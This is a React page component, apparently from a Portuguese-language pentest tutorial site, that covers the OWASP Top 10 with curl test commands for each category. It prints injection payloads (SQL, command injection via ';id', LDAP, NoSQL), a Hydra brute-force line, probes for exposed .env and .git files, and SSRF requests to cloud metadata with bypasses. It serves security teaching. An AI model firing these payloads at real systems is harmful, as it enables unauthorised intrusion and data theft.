import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function OwaspTop10() {
    return (
      <PageContainer
        title="OWASP Top 10"
        subtitle="As 10 vulnerabilidades mais críticas em aplicações web — o guia essencial para pentest web."
        difficulty="intermediario"
        timeToRead="20 min"
      >
        <AlertBox type="info" title="Referência universal">
          O OWASP Top 10 é o padrão de referência para segurança de aplicações web.
          Todo pentester web deve conhecer profundamente cada categoria.
        </AlertBox>

        <h2>A01 — Broken Access Control (Controle de Acesso Quebrado)</h2>
        <p>A vulnerabilidade mais comum. Ocorre quando usuários podem acessar recursos além das suas permissões.</p>
        <CodeBlock language="bash" code={'# Teste de IDOR (Insecure Direct Object Reference)\n# Alterar ID na URL:\n# https://app.com/api/user/123  →  https://app.com/api/user/124\n\n# Acessar painel admin sem autenticação:\ncurl -H "Cookie: role=user" https://app.com/admin\ncurl -H "X-Original-URL: /admin" https://app.com/\n\n# Forçar navegação vertical\ncurl https://app.com/user/dashboard  # como usuário normal\ncurl https://app.com/admin/dashboard # tentativa de acesso admin'} />

        <h2>A02 — Cryptographic Failures (Falhas Criptográficas)</h2>
        <CodeBlock language="bash" code={'# Verificar se dados sensíveis trafegam em HTTP\ncurl -v http://app.com/login 2>&1 | grep -i "password\\|senha"\n\n# Verificar certificado SSL\nopenssl s_client -connect app.com:443 2>&1 | grep -E "Protocol|Cipher"\n\n# Checar se cookies têm flag Secure e HttpOnly\ncurl -I https://app.com | grep -i "set-cookie"\n\n# Verificar se senha armazenada sem hash (em resposta de API)\ncurl -s https://app.com/api/profile | python3 -m json.tool'} />

        <h2>A03 — Injection (Injeção)</h2>
        <CodeBlock language="bash" code={'# SQL Injection (ver página SQLMap)\n# Teste manual básico:\ncurl "https://app.com/login" -d "user=admin\'--&pass=qualquer"\n\n# Command Injection\ncurl "https://app.com/ping?host=8.8.8.8;id"\ncurl "https://app.com/ping?host=`id`"\n\n# LDAP Injection\ncurl -d "user=admin)(|(1=1&pass=qualquer" https://app.com/login\n\n# NoSQL Injection (MongoDB)\ncurl -H "Content-Type: application/json" \\\n  -d \'{"user":{"$gt":""},"pass":{"$gt":""}}\'\n  https://app.com/api/login'} />

        <h2>A04 — Insecure Design (Design Inseguro)</h2>
        <CodeBlock language="bash" code={'# Testar funcionalidade de reset de senha\n# - A verificação é feita do lado do cliente?\n# - O token expira após uso?\n# - Qualquer e-mail pode solicitar reset de outro?\n\n# Rate limiting ausente\nfor i in {1..100}; do\n  curl -s -o /dev/null -w "%{http_code}" \\\n    -d "user=admin&pass=teste$i" https://app.com/login\n  echo ""\ndone'} />

        <h2>A05 — Security Misconfiguration (Configuração Incorreta)</h2>
        <CodeBlock language="bash" code={'# Verificar cabeçalhos de segurança ausentes\ncurl -I https://app.com | grep -iE "strict-transport|x-frame|x-content|csp|referrer"\n\n# Diretórios com listagem habilitada\ncurl https://app.com/uploads/   # verifica se lista arquivos\ncurl https://app.com/backup/\n\n# Arquivos de debug expostos\ncurl https://app.com/phpinfo.php\ncurl https://app.com/.git/config\ncurl https://app.com/web.config\ncurl https://app.com/.env\n\n# Stack traces expostos\ncurl "https://app.com/page?id=\'" | grep -i "error\\|sql\\|exception"'} />

        <h2>A06 — Vulnerable Components (Componentes Vulneráveis)</h2>
        <CodeBlock language="bash" code={'# Identificar versões de tecnologias\ncurl -I https://app.com | grep -iE "server|x-powered-by|via"\n\n# Checar dependências JavaScript\ncurl https://app.com | grep -oE "jquery[a-z0-9./\\-]*.js" | head\n\n# Usar whatweb para identificar tecnologias\nwhatweb https://app.com\n\n# Buscar CVEs das versões encontradas\n# https://nvd.nist.gov/vuln/search\n# searchsploit apache 2.4.49'} />

        <h2>A07 — Authentication Failures (Falhas de Autenticação)</h2>
        <CodeBlock language="bash" code={'# Brute force de login (ver Hydra)\nhydra -l admin -P /usr/share/wordlists/rockyou.txt https://app.com http-post-form\n\n# Credenciais padrão\ncurl -d "user=admin&pass=admin" https://app.com/login\ncurl -d "user=admin&pass=password" https://app.com/login\ncurl -d "user=admin&pass=123456" https://app.com/login\n\n# JWT fraco\n# Decodificar JWT sem validar:\necho "eyJ..." | base64 -d\n# Testar algoritmo "none":\n# Modificar header: {"alg":"none","typ":"JWT"}'} />

        <h2>A08 — Software and Data Integrity Failures</h2>
        <CodeBlock language="bash" code={'# Verificar se hashes de downloads batem\nwget https://app.com/app.tar.gz\nsha256sum app.tar.gz\n# Comparar com hash publicado no site\n\n# Deserialized object manipulation\n# Ferramentas: ysoserial (Java), phpggc (PHP)'} />

        <h2>A09 — Security Logging Failures</h2>
        <CodeBlock language="bash" code={'# Testar se falhas são logadas\n# Fazer múltiplas tentativas de login erradas\n# Ver se há resposta diferente ou bloqueio\n\n# Log injection\ncurl -H "User-Agent: Hacker\\nAdmin: true" https://app.com/'} />

        <h2>A10 — Server-Side Request Forgery (SSRF)</h2>
        <CodeBlock language="bash" code={'# SSRF básico — fazer servidor acessar URL interna\ncurl "https://app.com/fetch?url=http://localhost/"\ncurl "https://app.com/fetch?url=http://127.0.0.1:8080/admin"\ncurl "https://app.com/fetch?url=http://169.254.169.254/"  # AWS metadata\n\n# Bypass de filtros\ncurl "https://app.com/fetch?url=http://127.0.0.1%09"\ncurl "https://app.com/fetch?url=http://2130706433"  # 127.0.0.1 em decimal\ncurl "https://app.com/fetch?url=http://0x7f000001"   # hex'} />

        <AlertBox type="success" title="Próximos passos">
          Use Burp Suite para automatizar e organizar todos esses testes. A ferramenta OWASP ZAP
          também oferece scan automático baseado no OWASP Top 10.
        </AlertBox>
      </PageContainer>
    );
  }
  